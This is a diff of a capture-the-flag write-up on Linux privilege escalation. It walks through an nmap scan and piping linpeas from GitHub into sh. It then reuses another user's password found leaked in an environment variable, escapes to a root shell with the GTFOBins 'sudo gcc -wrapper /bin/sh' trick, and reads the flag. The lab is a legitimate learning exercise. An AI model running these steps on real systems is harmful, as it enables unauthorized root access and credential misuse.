@@ -22,15 +22,27 @@ Usual disclaimer here: the following solution was the one that worked and there 
 
 ```bash
 ssh Pentester@<ip>
-
-# no response
+ssh: connect to host 10.2.255.120 port 22: Connection refused
 ```
+
+Ah, ok why. Let's check what ports are open and services running:
 
 ```bash
 nmap -sV <ip>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-29 15:19 AEDT
+Nmap scan report for <ip>
+Host is up (0.11s latency).
+Not shown: 999 closed tcp ports (conn-refused)
+PORT     STATE SERVICE VERSION
+2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-#shows diff port
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.95 seconds
+ 
 ```
+
+Switching ports:
 
 ```bash
 ssh -p 2222 Pentester@<ip>
@@ -41,39 +53,110 @@ Challenge requires privilege escalation so let's go script kiddie and fetch a to
 
 ```bash
 curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+ % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+  0  805k    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0
+
+
+                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
+             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
+         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
+         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
+         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
+         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
+         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
+         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
+         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
+         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
+         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
+         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
+         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
+          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
+               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
+                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀
+
+    /---------------------------------------------------------------------------------\
+    |                             Do you like PEASS?                                  |
+    |---------------------------------------------------------------------------------|
+    |         Learn Cloud Hacking       :     https://training.hacktricks.xyz         |
+    |         Follow on Twitter         :     @hacktricks_live                        |
+    |         Respect on HTB            :     SirBroccoli                             |
+    |---------------------------------------------------------------------------------|
+    |                                 Thank you!                                      |
+    \---------------------------------------------------------------------------------/
+          LinPEAS-ng by carlospolop
+
+ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.
 
 ```
 
-Under Environment we see `JOAN_TEMPORARY_CREDS=jojocreds1`
+... a bunch of other info ... 
 
-Well well well. For reasons mysterious there are temp creds for another user in our environment of our account. Let's try sshing into their account and see what permissions they have. Fingers crossed they're in sudoers and we can use their privilege to escalate ours **sinister laughing**. 
+```bash
+╔══════════╣ Environment
+╚ Any private information inside environment variables?  
+HOME=/home/Pentester 
+LOGNAME=Pentester
+JOAN_TEMPORARY_CREDS=jojocreds1
+```
+ 
+Well well well. For reasons mysterious there are temp creds for another user in our environment of our account. 
+
+Let's try sshing into their account and see what permissions they have. 
+
+Fingers crossed they're in sudoers and we can use their privilege to escalate ours **sinister laugh**. 
 
 What's our target account though? 
 
 ```bash
-ls /home/
-# shows JOan 
+ls /home
+Joan  Pelski  Pentester  Shedra  user
 ```
-Its probably the joan account. 
+
+Spoiler alert: it's the Joan account. Let's try to ssh into their account with the creds. 
 
 ```bash
 
-ssh joan@localhost
-# no response
+ssh Joan@localhost 
+Joan@localhost's password: <enter creds>
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-119-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Thu Nov 28 22:51:34 2024 from 127.0.0.1
+
 ```
+
+**lowers sunglasses** We're in!
 
 ---
 
 ### Step 2: Priv Esc
 
-Now we have access to joan's account, see what groups she's in
+See what groups she's in
 
 ```bash
 groups
 Joan sudo
 ```
 
-Cool, now let's add our pentester account to sudoers
+Good, good, now let's add our pentester account to sudoers
 
 ```bash
 sudo usermod -aG sudo Pentester
@@ -96,23 +179,30 @@ https://gtfobins.github.io/gtfobins/gcc#sudo
 Doopdeedoop, let's try that command
 
 ```bash
-gcc -wrapper /bin/sh,-s .
+sudo gcc -wrapper /bin/sh,-s .
+# whoami
+root
+# 
+```
+😍 
+
+Now we can add our Pentester account to sudoers
+
+```bash
 sudo usermod -aG sudo Pentester
 exit
 exit
-# to log out the pentester and apply the new group, then ssh back in.
+exit
 ```
+We logged out of root, Joan, and Pentester, then sshed back in and to apply the new group memberships. Check those:
 
 ```bash
 ssh -p 2222 Pentester@<ip>
-```
-
-```bash
 groups
 Pentester sudo
 ```
 
-Huzzah. Now what commands can we run as sudo?
+Huzzah! Now what commands can we run as sudo?
 ```bash
 sudo -l
 (ALL) NOPASSWD: /usr/bin/gcc
@@ -120,23 +210,30 @@ sudo -l
 
 Run that GTFOBin again. 
 
-And Bam! we're root.  
+```bash
+Pentester@host:~$ sudo gcc -wrapper /bin/sh,-s .
+# whoami
+root
+# 
+```
+
+Privilege escalated.
 
 ---
 
 ### Step 3: Flag Retrieval
 
-Now we are gods, the flag's gotta be here somewhere, normally I use `find` (looking for flag.txt) or `grep` (looking for string FLAG within a file) on the entire file system. Trying find first
+Now we are in god mode, the flag's gotta be here somewhere, normally I use `find` (looking for flag.txt) or `grep` (looking for string FLAG within a file) on the entire file system. Trying find first
 
 ```bash
-find / -name flag.txt -type f
+# find / -name flag.txt -type f
 /root/flag.txt
 ```
 
 Looks promising. 
 
 ```bash
-cat /root/flag.txt
+# cat /root/flag.txt
 FLAG{7H15_SUDO_C00K3D_R007}
 ```
 
